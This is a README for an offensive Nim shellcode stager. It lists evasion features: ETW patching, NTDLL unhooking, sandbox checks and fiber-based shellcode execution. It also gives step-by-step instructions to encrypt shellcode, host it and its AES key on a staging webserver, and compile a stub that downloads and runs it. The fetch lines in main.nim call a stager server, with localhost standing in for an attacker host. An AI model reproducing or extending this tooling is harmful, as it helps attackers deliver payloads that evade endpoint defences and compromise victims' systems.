# Simple Nim Stager w/ a few features

## Features

- HTTP Stager (with AES key and IV staged)
- Shellcode execution using Fibers
- Dynamic functions retrieval
- AES 256 CTR Decryption
- Basic sandbox check (Numbers of CPUs, Amount of RAM, C:\ capacity, Sleep timer)
- ETW Patching
- NTDLL Unhooking

## Usage

### 1. Setup encrypt.nim

First of all, you have to change a few variables in encrypt.nim file.
#### 1.1 Shellcode file
```nim
let shellcode = readFile("shellcode.bin") # <-- TO EDIT
```

#### 1.2 Envkey (optional)
```nim
envkey: string = "AAAAAAAAAAAA" # <-- TO EDIT
```

With that being done, you can run `encrypt.nim`.

```nim
$> nim r ./encrypt.nim
```

It is going to generate you 2 files : `sc_enc.bin` (the encrypted shellcode) and `constants.json` (where IV and KEY are stored). You have to take those two files and put it in the root of the webserver you want to use to stage your payload.

### 2. Edit main.nim
In the main stub you have to replace the default localhost to your stager server.

```nim
var enctext =  toByteSeq(client.getContent("http://127.0.0.1:8000/sc_enc.bin")) # <-- TO EDIT
var constants = parseJson(client2.getContent("http://127.0.0.1:8000/constants.json")) # <-- TO EDIT
```

### 3. Compile
You can now compile `main.nim`.

```nim
$> nim c -d:release ./main.nim
```

## Ressources used

- https://github.com/byt3bl33d3r/OffensiveNim
